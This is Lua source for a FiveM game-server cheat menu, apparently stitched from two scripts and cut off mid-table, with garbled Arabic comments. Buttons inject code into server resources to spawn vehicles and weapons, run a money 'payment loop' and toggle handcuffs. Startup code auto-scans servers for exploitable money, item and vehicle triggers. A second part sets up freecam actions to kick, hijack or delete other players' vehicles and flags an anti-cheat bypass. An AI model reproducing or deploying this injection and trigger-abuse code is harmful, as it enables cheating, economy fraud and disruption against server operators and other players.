                    MachoMenuNotification("Money", "Payment loop speed updated to: " .. numSpeed .. "ms")
                end
            else
                MachoMenuNotification("Error", "Invalid speed (minimum 1ms)")
            end
        else
            MachoMenuNotification("Error", "Enter a speed value first")
        end
    end)
    
    MachoMenuButton(SelfSection, "Stop Payment Loop", function()
        if isPaymentLoopRunning then
            isPaymentLoopRunning = false
            MachoMenuNotification("Money", "Payment loop stopped")
        else
            MachoMenuNotification("Money", "Payment loop not running")
        end
    end)
local PlayersSection = MachoMenuGroup(MainTab, "Players", 
        TabsBarWidth + SERVERCFWEachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
    
    local playerIdInput = MachoMenuInputbox(PlayersSection, "Player ID (-1 for all)", "Enter ID or -1...")
    setupPlayerSectionButtons(PlayersSection, playerIdInput)
local vrptab = MachoMenuAddTab(MenuWindow, "VRP")
    local vrpSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
    local vrpSERVERCFWEachSectionWidth = (vrpSERVERCFWSectionChildWidth - 20) / 2 
local GeneralRightBottom = MachoMenuGroup(vrptab, "Self", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
local vrptabplyaers = MachoMenuGroup(vrptab, "Vehicle & CheckBox", 
        TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, MenuSize.y - 5)
local vehicleSpawnInput = MachoMenuInputbox(GeneralRightBottom, "Vehicle/Weapon Model", "Enter Vehicle/Weapon model...")

MachoMenuButton(GeneralRightBottom, "Spawn Vehicle", function()
   local carname = MachoMenuGetInputbox(vehicleSpawnInput)
   if carname and carname ~= "" then
       MachoInjectResource("vrp", 'tvRP.spawnGarageVehicle("car", "' .. carname .. '", nil, 12345)')
       MachoMenuNotification("Spawn", "Spawning vehicle: " .. carname)
   else
       MachoMenuNotification("Error", "Error vehicle name")
   end
end)

MachoMenuButton(GeneralRightBottom, "Despawn vehicle", function()
    MachoInjectResource("vrp", [[tvRP.despawnGarageVehicle("car", 100000000000000000000000)]])
    MachoMenuNotification("Despawn Access", "Despawn vehicle Activated")
end)
MachoMenuButton(GeneralRightBottom, "Spawn Weapon", function()
   local weaponName = MachoMenuGetInputbox(vehicleSpawnInput)
   if weaponName and weaponName ~= "" then
       MachoInjectResource("vrp", [[
           tvRP.giveWeapons({
               []] .. weaponName .. [[] = {ammo = 999}
           }, true)
       ]])
       MachoMenuNotification("Self", "Giving VRP weapon: " .. weaponName)
   else
       MachoMenuNotification("Error", "Enter a weapon name")
   end
end)  

MachoMenuButton(GeneralRightBottom, "Cuff & Uncuff", function()
    MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
    MachoMenuNotification("Uncuff Access", "Uncuff Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Cuff & Uncuff Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource("vrp", [[tvRP.toggleHandcuff()]])
        MachoMenuNotification("Cuff", "Cuff & Uncuff activated")
    end
end)
MachoMenuButton(GeneralRightBottom, "Undrag", function()
    MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
    MachoMenuNotification("Undrag Access", "Undrag Activated")
end)
local selectedKey = 0

MachoMenuKeybind(GeneralRightBottom, "Undrag Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        MachoInjectResource('Melix_Files', [[TriggerEvent("dr:undrag")]])
        MachoMenuNotification("Undrag Access", "Undrag Activated")
    end
end)

MachoMenuCheckbox(GeneralRightBottom, "Toggle Blips", 
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Activated")
        end,
        function()
            MachoInjectResource('vrp', [[TriggerEvent("showBlips")]])
            MachoMenuNotification("Blips", "Blips Deactivated")
        end
)
local esxtab = MachoMenuAddTab(MenuWindow, "ESX")
local esxtabmain = MachoMenuGroup(esxtab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local esxtabtrigger = MachoMenuGroup(esxtab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local esxtabidk = MachoMenuGroup(esxtab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
MachoMenuText(MenuWindow,"Setting & tools")
local toolstab = MachoMenuAddTab(MenuWindow, "Tools")
local toolstabmain = MachoMenuGroup(toolstab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local toolstrigger = MachoMenuGroup(toolstab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local toolsidk = MachoMenuGroup(toolstab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
MachoMenuButton(toolstabmain, "Scan Players", function()
    MachoMenuNotification("Scanner", "Scanning all players...")
    
    Citizen.CreateThread(function()
        local playersList = {}
        local onlineCount = 0
        
        -- Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ†
        for i = 0, 255 do
            if NetworkIsPlayerActive(i) then
                local serverId = GetPlayerServerId(i)
                local playerName = GetPlayerName(i)
                local playerPed = GetPlayerPed(i)
                local playerCoords = GetEntityCoords(playerPed)
                local isMe = (i == PlayerId())
                
                -- Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
                local health = GetEntityHealth(playerPed)
                local maxHealth = GetEntityMaxHealth(playerPed)
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                local vehicleName = "On Foot"
                
                if vehicle ~= 0 then
                    local vehicleModel = GetEntityModel(vehicle)
                    vehicleName = GetDisplayNameFromVehicleModel(vehicleModel)
                end
                
                table.insert(playersList, {
                    id = i,
                    serverId = serverId,
                    name = playerName,
                    coords = playerCoords,
                    health = health,
                    maxHealth = maxHealth,
                    vehicle = vehicleName,
                    isMe = isMe
                })
                
                onlineCount = onlineCount + 1
            end
        end
        
        -- ØªØ±ØªÙŠØ¨ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø­Ø³Ø¨ Server ID
        table.sort(playersList, function(a, b)
            return a.serverId < b.serverId
        end)
        
        -- Ø·Ø¨Ø§Ø¹Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ÙÙŠ F8
        print("^3========================================")
        print("^2         PLAYERS SCAN RESULTS         ")
        print("^3========================================")
        print("^6Total Online Players: ^5" .. onlineCount)
        print("^3========================================")
        print("")
        
        for _, player in ipairs(playersList) do
            local nameColor = "^7" -- Ø£Ø¨ÙŠØ¶ Ø¹Ø§Ø¯ÙŠ
            local statusText = ""
            
            if player.isMe then
                nameColor = "^2" -- Ø£Ø®Ø¶Ø± Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ø­Ø§Ù„ÙŠ
                statusText = " ^3[YOU]"
            end
            
            -- Ø­Ø§Ù„Ø© Ø§Ù„ØµØ­Ø©
            local healthPercent = math.floor((player.health / player.maxHealth) * 100)
            local healthColor = "^2" -- Ø£Ø®Ø¶Ø±
            if healthPercent < 50 then
                healthColor = "^3" -- Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ
            end
            if healthPercent < 25 then
                healthColor = "^1" -- Ø£Ø­Ù…Ø±
            end
            
            -- Ø·Ø¨Ø§Ø¹Ø© Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù„Ø§Ø¹Ø¨
            print("^6Player ID: ^5" .. player.id .. " ^6| Server ID: ^5" .. player.serverId)
            print("^6Name: " .. nameColor .. player.name .. statusText)
            print("^6Health: " .. healthColor .. player.health .. "^7/" .. player.maxHealth .. " ^7(" .. healthPercent .. "%)")
            print("^6Vehicle: ^7" .. player.vehicle)
            print("^6Position: ^7X: " .. string.format("%.1f", player.coords.x) .. 
                  " ^7Y: " .. string.format("%.1f", player.coords.y) .. 
                  " ^7Z: " .. string.format("%.1f", player.coords.z))
            print("^3----------------------------------------")
        end
        
        print("")
        print("^3========================================")
        print("^2           SCAN COMPLETED              ")
        print("^3========================================")
        
        -- Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø¥Ø¶Ø§ÙÙŠØ©
        local playersInVehicles = 0
        local playersOnFoot = 0
        
        for _, player in ipairs(playersList) do
            if player.vehicle == "On Foot" then
                playersOnFoot = playersOnFoot + 1
            else
                playersInVehicles = playersInVehicles + 1
            end
        end
        
        print("^6Statistics:")
        print("^7- Players on foot: ^5" .. playersOnFoot)
        print("^7- Players in vehicles: ^5" .. playersInVehicles)
        print("^3========================================")
        
        -- Ø¥Ù†Ø´Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ù…Ø¨Ø³Ø·Ø© Ù„Ù„Ù†Ø³Ø®
        print("")
        print("^2Quick Copy List:")
        print("^3----------------")
        for _, player in ipairs(playersList) do
            local meTag = player.isMe and " [YOU]" or ""
            print("^5" .. player.serverId .. " ^7- " .. player.name .. meTag)
        end
        print("^3----------------")
        
        MachoMenuNotification("Scanner", "Scan complete! Check F8 console for results.")
    end)
end)
local selectedKey = 0x14 -- Ø§Ù„Ø²Ø± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ Ù‡Ùˆ 0x14 (Caps Lock)
local nocliptx = false  -- ØªØµØ­ÙŠØ­ Ø§Ù„ØºÙ„Ø·: flase â†’ false

-- Ø¥Ø¹Ø¯Ø§Ø¯ ÙˆØ§Ø¬Ù‡Ø© Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø²Ø±
MachoMenuKeybind(toolstabmain, "Menu Key", 0x14, function(key, toggle)
    selectedKey = key    -- ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø²Ø± Ø§Ù„Ù…Ø®ØªØ§Ø±
    MachoMenuSetKeybind(MenuWindow, selectedKey) -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø²Ø± Ø§Ù„Ù…Ø®ØªØ§Ø±
end)

-- ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø²Ø± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
MachoMenuSetKeybind(MenuWindow, selectedKey)

local settingtab = MachoMenuAddTab(MenuWindow, "settings")
local settingbmain = MachoMenuGroup(settingtab, "Main", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
local settingigger = MachoMenuGroup(settingtab, "triggers", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)
local settingidk = MachoMenuGroup(settingtab, "idk waiting", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)

end



-- Main initialization
Citizen.CreateThread(function()
    Citizen.Wait(2000)
    MachoMenuNotification("NitWit", "Auto-searching for triggers...")
    local foundAny = comprehensiveSearch()
    if foundAny then
        local totalTriggers = #foundTriggers.items + #foundTriggers.money + #foundTriggers.vehicle + #foundTriggers.payment
        MachoMenuNotification("Success", "Found " .. totalTriggers .. " triggers")
    else
        MachoMenuNotification("Notice", "No triggers found - menu available")
    end
    Citizen.Wait(500)
    createMenu()
    MachoMenuNotification("NitWit Ready", "Dynamic menu ready - Search completed")
    
    -- Start background silent search
    backgroundSilentSearch()
end)



---@diagnostic disable: undefined-global
local OSINT = {}
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local WeaponsLabels = { [GetHashKey('weapon_unarmed')] = 'Fists', [GetHashKey('weapon_knife')] = 'Knife', [GetHashKey('weapon_nightstick')] = 'Nightstick', [GetHashKey('weapon_hammer')] = 'Hammer', [GetHashKey('weapon_bat')] = 'Baseball Bat', [GetHashKey('weapon_golfclub')] = 'Golf Club', [GetHashKey('weapon_crowbar')] = 'Crowbar', [GetHashKey('weapon_pistol')] = 'Pistol', [GetHashKey('weapon_pistol_mk2')] = 'Pistol Mk II', [GetHashKey('weapon_snspistol_mk2')] = 'SNS Pistol Mk II', [GetHashKey('weapon_ceramicpistol')] = 'Ceramic Pistol', [GetHashKey('weapon_revolver_mk2')] = 'Heavy Revolver Mk II', [GetHashKey('weapon_doubleaction')] = 'Double-Action Revolver', [GetHashKey('weapon_gadgetpistol')] = 'Gadget Pistol', [GetHashKey('weapon_pistolxm3')] = 'WM 29 Pistol', [GetHashKey('weapon_combatpistol')] = 'Combat Pistol', [GetHashKey('weapon_appistol')] = 'AP Pistol', [GetHashKey('weapon_pistol50')] = 'Pistol .50', [GetHashKey('weapon_microsmg')] = 'Micro SMG', [GetHashKey('weapon_smg')] = 'SMG', [GetHashKey('weapon_assaultsmg')] = 'Assault SMG', [GetHashKey('weapon_assaultrifle')] = 'Assault Rifle', [GetHashKey('weapon_assaultrifle_mk2')] = 'Assault Rifle Mk II', [GetHashKey('weapon_specialcarbine_mk2')] = 'Special Carbine Mk II', [GetHashKey('weapon_bullpuprifle_mk2')] = 'Bullpup Rifle Mk II', [GetHashKey('weapon_militaryrifle')] = 'Military Rifle', [GetHashKey('weapon_tacticalrifle')] = 'Service Carbine', [GetHashKey('weapon_battlerifle')] = 'Battle Rifle', [GetHashKey('weapon_carbinerifle')] = 'Carbine Rifle', [GetHashKey('weapon_advancedrifle')] = 'Advanced Rifle', [GetHashKey('weapon_mg')] = 'MG', [GetHashKey('weapon_combatmg')] = 'Combat MG', [GetHashKey('weapon_pumpshotgun')] = 'Pump Shotgun', [GetHashKey('weapon_sawnoffshotgun')] = 'Sawed-Off Shotgun', [GetHashKey('weapon_assaultshotgun')] = 'Assault Shotgun', [GetHashKey('weapon_bullpupshotgun')] = 'Bullpup Shotgun', [GetHashKey('weapon_hackingdevice')] = 'Hacking Device', [GetHashKey('weapon_stungun')] = 'Stun Gun', [GetHashKey('weapon_stungun_mp')] = 'Stun Gun MP', [GetHashKey('weapon_sniperrifle')] = 'Sniper Rifle', [GetHashKey('weapon_heavysniper')] = 'Heavy Sniper', [GetHashKey('weapon_grenadelauncher')] = 'Grenade Launcher', [GetHashKey('weapon_rpg')] = 'RPG', [GetHashKey('weapon_minigun')] = 'Minigun', [GetHashKey('weapon_grenade')] = 'Grenade', [GetHashKey('weapon_stickybomb')] = 'Sticky Bomb', [GetHashKey('weapon_smokegrenade')] = 'Smoke Grenade', [GetHashKey('weapon_bzgas')] = 'BZ Gas', [GetHashKey('weapon_molotov')] = 'Molotov Cocktail', [GetHashKey('weapon_fireextinguisher')] = 'Fire Extinguisher', [GetHashKey('weapon_petrolcan')] = 'Jerry Can', [GetHashKey('weapon_ball')] = 'Baseball', [GetHashKey('weapon_snspistol')] = 'SNS Pistol', [GetHashKey('weapon_bottle')] = 'Broken Bottle', [GetHashKey('weapon_gusenberg')] = 'Gusenberg Sweeper', [GetHashKey('weapon_specialcarbine')] = 'Special Carbine', [GetHashKey('weapon_heavypistol')] = 'Heavy Pistol', [GetHashKey('weapon_bullpuprifle')] = 'Bullpup Rifle', [GetHashKey('weapon_dagger')] = 'Dagger', [GetHashKey('weapon_vintagepistol')] = 'Vintage Pistol', [GetHashKey('weapon_firework')] = 'Firework Launcher', [GetHashKey('weapon_musket')] = 'Musket', [GetHashKey('weapon_heavyshotgun')] = 'Heavy Shotgun', [GetHashKey('weapon_marksmanrifle')] = 'Marksman Rifle', [GetHashKey('weapon_hominglauncher')] = 'Homing Launcher', [GetHashKey('weapon_proxmine')] = 'Proximity Mines', [GetHashKey('weapon_snowball')] = 'Snowball', [GetHashKey('weapon_flaregun')] = 'Flare Gun', [GetHashKey('weapon_garbagebag')] = 'Garbage Bag', [GetHashKey('weapon_handcuffs')] = 'Handcuffs', [GetHashKey('weapon_combatpdw')] = 'Combat PDW', [GetHashKey('weapon_marksmanpistol')] = 'Marksman Pistol', [GetHashKey('weapon_knuckle')] = 'Knuckle Dusters', [GetHashKey('weapon_hatchet')] = 'Hatchet', [GetHashKey('weapon_railgun')] = 'Railgun', [GetHashKey('weapon_machinepistol')] = 'Machine Pistol', [GetHashKey('weapon_switchblade')] = 'Switchblade', [GetHashKey('weapon_revolver')] = 'Heavy Revolver', [GetHashKey('weapon_heavyrifle')] = 'Heavy Rifle', [GetHashKey('weapon_dbshotgun')] = 'Double Barrel Shotgun', [GetHashKey('weapon_compactrifle')] = 'Compact Rifle', [GetHashKey('weapon_battleaxe')] = 'Battle Axe', [GetHashKey('weapon_compactlauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_minismg')] = 'Mini SMG', [GetHashKey('weapon_pipebomb')] = 'Pipe Bomb', [GetHashKey('weapon_poolcue')] = 'Pool Cue', [GetHashKey('weapon_wrench')] = 'Wrench', [GetHashKey('weapon_autoshotgun')] = 'Sweeper Shotgun', [GetHashKey('weapon_bread')] = 'Piece of Bread', [GetHashKey('weapon_stone_hatchet')] = 'Stone Hatchet', [GetHashKey('weapon_rayminigun')] = 'Unholy Hellbringer', [GetHashKey('weapon_raycarbine')] = 'Widowmaker', [GetHashKey('weapon_compactgrenadelauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_smugglerpistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_raypistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_perico_pistol')] = 'Ceramic Pistol', [GetHashKey('weapon_carbinerifle_mk2')] = 'Carbine Rifle Mk II', [GetHashKey('weapon_combatmg_mk2')] = 'Combat MG Mk II', [GetHashKey('weapon_heavysniper_mk2')] = 'Heavy Sniper Mk II', [GetHashKey('weapon_marksmanrifle_mk2')] = 'Marksman Rifle Mk II', [GetHashKey('weapon_pumpshotgun_mk2')] = 'Pump Shotgun Mk II', [GetHashKey('weapon_smg_mk2')] = 'SMG Mk II', [GetHashKey('weapon_raycarbine_mk2')] = 'Widowmaker Mk II', [GetHashKey('weapon_machete')] = 'Machete', [GetHashKey('weapon_flashlight')] = 'Flashlight', [GetHashKey('weapon_hazardousknife')] = 'Hazardous Knife', [GetHashKey('weapon_navyrevolver')] = 'Navy Revolver', [GetHashKey('weapon_golfball')] = 'Golf Ball' }
local FirstInjectionPassed = false
local FreecamBypassReaperV4 = false
local FreecamInjected = false
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG", "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Kick from Vehicle", "Hijack Vehicle", "Delete Vehicle" }
local FreecamHoveredIndex = 1
local IsFalling = false
local NoCollision = false
local DeletePrevious = false
local TeleportInto = false
local MappedKeys = {
    [27] = "Escape", [112] = "F1", [113] = "F2",
    [114] = "F3", [115] = "F4", [116] = "F5",
    [117] = "F6", [118] = "F7", [119] = "F8",
    [120] = "F9", [121] = "F10", [122] = "F11",
    [123] = "F12", [192] = "`",
    [49] = "1", [50] = "2", [51] = "3",
    [52] = "4", [53] = "5", [54] = "6",
    [55] = "7", [56] = "8", [57] = "9",
    [48] = "0", [189] = "-", [187] = "=",
    [8] = "Backspace", [9] = "Tab", [81] = "Q",
    [87] = "W", [69] = "E", [82] = "R",
    [84] = "T", [89] = "Y", [85] = "U",
    [73] = "I", [79] = "O", [80] = "P",
    [219] = "[", [221] = "]", [220] = "\\",
    [20] = "CapsLock", [65] = "A", [83] = "S",
    [68] = "D", [70] = "F", [71] = "G",
    [72] = "H", [74] = "J", [75] = "K",
    [76] = "L", [186] = ";", [222] = "'",
    [13] = "Enter", [16] = "Shift", [90] = "Z",
    [88] = "X", [67] = "C", [86] = "V",
    [66] = "B", [78] = "N", [77] = "M",
    [188] = ",", [190] = ".", [191] = "/",
    [17] = "Control", [46] = "Delete", [33] = "PageUp",
    [34] = "PageDown", [35] = "End", [36] = "Home",
    [38] = "ArrowUp", [40] = "ArrowDown", [37] = "ArrowLeft", [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322,    -- Escape
    [112] = 288,   -- F1
    [113] = 289,   -- F2
    [114] = 170,   -- F3
    [115] = 167,   -- F4
    [116] = 166,   -- F5
    [117] = 167,   -- F6
    [118] = 168,   -- F7
    [119] = 169,   -- F8
    [120] = 56,    -- F9
    [121] = 57,    -- F10
    [122] = 344,   -- F11
    [123] = 345,   -- F12
    [192] = 243,   -- `
    [49] = 157,    -- 1
    [50] = 158,    -- 2
    [51] = 160,    -- 3
    [52] = 164,    -- 4
    [53] = 165,    -- 5
    [54] = 159,    -- 6
    [55] = 161,    -- 7
    [56] = 162,    -- 8
    [57] = 163,    -- 9
    [48] = 82,     -- 0
    [189] = 84,    -- -
    [187] = 83,    -- =
    [8] = 177,     -- Backspace
    [9] = 37,      -- Tab
    [81] = 44,     -- Q
    [87] = 32,     -- W
    [69] = 46,     -- E
    [82] = 45,     -- R
    [84] = 245,    -- T
    [89] = 246,    -- Y
    [85] = 303,    -- U
    [73] = 74,     -- I
    [79] = 199,    -- O
    [80] = 7,      -- P
    [219] = 39,    -- [
    [221] = 40,    -- ]
    [220] = 36,    -- \
    [20] = 137,    -- CapsLock
    [65] = 34,     -- A
    [83] = 33,     -- S
    [68] = 30,     -- D
    [70] = 49,     -- F
    [71] = 47,     -- G
    [72] = 74,     -- H
    [74] = 311,    -- J
    [75] = 311,    -- K
    [76] = 7,      -- L
    [186] = 81,    -- ;
    [222] = 82,    -- '
    [13] = 18,     -- Enter
    [16] = 21,     -- Shift
    [90] = 20,     -- Z
    [88] = 73,     -- X
    [67] = 26,     -- C
    [86] = 0,      -- V
    [66] = 29,     -- B
    [78] = 249,    -- N
    [77] = 244,    -- M
    [188] = 82,    -- ,
    [190] = 81,    -- .
    [191] = 83,    -- /
    [17] = 36,     -- Control
    [46] = 178,    -- Delete
    [33] = 10,     -- PageUp
    [34] = 11,     -- PageDown
    [35] = 213,    -- End
    [36] = 213,    -- Home
    [38] = 27,     -- ArrowUp
    [40] = 173,    -- ArrowDown
    [37] = 174,    -- ArrowLeft
    [39] = 175     -- ArrowRight
}


local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = {label = "Unarmed", hash = GetHashKey("weapon_unarmed")},
    ["weapon_knife"] = {label = "Knife", hash = GetHashKey("weapon_knife")},
    ["weapon_dagger"] = {label = "Dagger", hash = GetHashKey("weapon_dagger")},
    ["weapon_bat"] = {label = "Baseball Bat", hash = GetHashKey("weapon_bat")},
    ["weapon_bottle"] = {label = "Broken Bottle", hash = GetHashKey("weapon_bottle")},
    ["weapon_crowbar"] = {label = "Crowbar", hash = GetHashKey("weapon_crowbar")},
    ["weapon_golfclub"] = {label = "Golf Club", hash = GetHashKey("weapon_golfclub")},
    ["weapon_hammer"] = {label = "Hammer", hash = GetHashKey("weapon_hammer")},
    ["weapon_hatchet"] = {label = "Hatchet", hash = GetHashKey("weapon_hatchet")},
    ["weapon_machete"] = {label = "Machete", hash = GetHashKey("weapon_machete")},
    ["weapon_switchblade"] = {label = "Switchblade", hash = GetHashKey("weapon_switchblade")},
    ["weapon_nightstick"] = {label = "Nightstick", hash = GetHashKey("weapon_nightstick")},
    ["weapon_wrench"] = {label = "Wrench", hash = GetHashKey("weapon_wrench")},

    -- Handguns
    ["weapon_pistol"] = {label = "Pistol", hash = GetHashKey("weapon_pistol")},
    ["weapon_pistol_mk2"] = {label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2")},
    ["weapon_combatpistol"] = {label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol")},
    ["weapon_appistol"] = {label = "AP Pistol", hash = GetHashKey("weapon_appistol")},
    ["weapon_stungun"] = {label = "Taser", hash = GetHashKey("weapon_stungun")},
    ["weapon_pistol50"] = {label = "Pistol .50", hash = GetHashKey("weapon_pistol50")},
    ["weapon_snspistol"] = {label = "SNS Pistol", hash = GetHashKey("weapon_snspistol")},
    ["weapon_heavypistol"] = {label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol")},
    ["weapon_vintagepistol"] = {label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol")},
    ["weapon_flaregun"] = {label = "Flare Gun", hash = GetHashKey("weapon_flaregun")},

    -- SMGs
    ["weapon_microsmg"] = {label = "Micro SMG", hash = GetHashKey("weapon_microsmg")},
    ["weapon_smg"] = {label = "SMG", hash = GetHashKey("weapon_smg")},
    ["weapon_smg_mk2"] = {label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2")},
    ["weapon_assaultsmg"] = {label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg")},
    ["weapon_machinepistol"] = {label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol")},
    ["weapon_minismg"] = {label = "Mini SMG", hash = GetHashKey("weapon_minismg")},
    ["weapon_combatpdw"] = {label = "Combat PDW", hash = GetHashKey("weapon_combatpdw")},

    -- Rifles
    ["weapon_assaultrifle"] = {label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle")},
    ["weapon_assaultrifle_mk2"] = {label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2")},
    ["weapon_carbinerifle"] = {label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle")},
    ["weapon_carbinerifle_mk2"] = {label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2")},
    ["weapon_advancedrifle"] = {label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle")},
    ["weapon_specialcarbine"] = {label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine")},
    ["weapon_bullpuprifle"] = {label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle")},
    ["weapon_bullpuprifle_mk2"] = {label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2")},
    ["weapon_compactrifle"] = {label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle")},
    ["weapon_marksmanrifle"] = {label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle")},

    -- Shotguns
    ["weapon_pumpshotgun"] = {label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun")},
    ["weapon_pumpshotgun_mk2"] = {label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2")},
    ["weapon_sawnoffshotgun"] = {label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun")},
    ["weapon_assaultshotgun"] = {label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun")},
    ["weapon_bullpupshotgun"] = {label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun")},
    ["weapon_heavyshotgun"] = {label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun")},
    ["weapon_autoshotgun"] = {label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun")},

    -- Snipers
    ["weapon_sniperrifle"] = {label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle")},
    ["weapon_heavysniper"] = {label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper")},
    ["weapon_heavysniper_mk2"] = {label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2")},
    ["weapon_marksmanrifle_mk2"] = {label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2")},

    -- Explosives / Launchers
    ["weapon_grenade"] = {label = "Grenade", hash = GetHashKey("weapon_grenade")},
    ["weapon_stickybomb"] = {label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb")},
    ["weapon_molotov"] = {label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov")},
    ["weapon_pipebomb"] = {label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb")},
    ["weapon_proxmine"] = {label = "Proximity Mine", hash = GetHashKey("weapon_proxmine")},
    ["weapon_rpg"] = {label = "RPG", hash = GetHashKey("weapon_rpg")},
    ["weapon_grenadelauncher"] = {label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher")},
    ["weapon_hominglauncher"] = {label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher")},
    ["weapon_minigun"] = {label = "Minigun", hash = GetHashKey("weapon_minigun")},
    ["weapon_railgun"] = {label = "Railgun", hash = GetHashKey("weapon_railgun")},

    -- Throwables / Misc
    ["weapon_ball"] = {label = "Baseball", hash = GetHashKey("weapon_ball")},
    ["weapon_smokegrenade"] = {label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade")},
    ["weapon_flare"] = {label = "Flare", hash = GetHashKey("weapon_flare")},
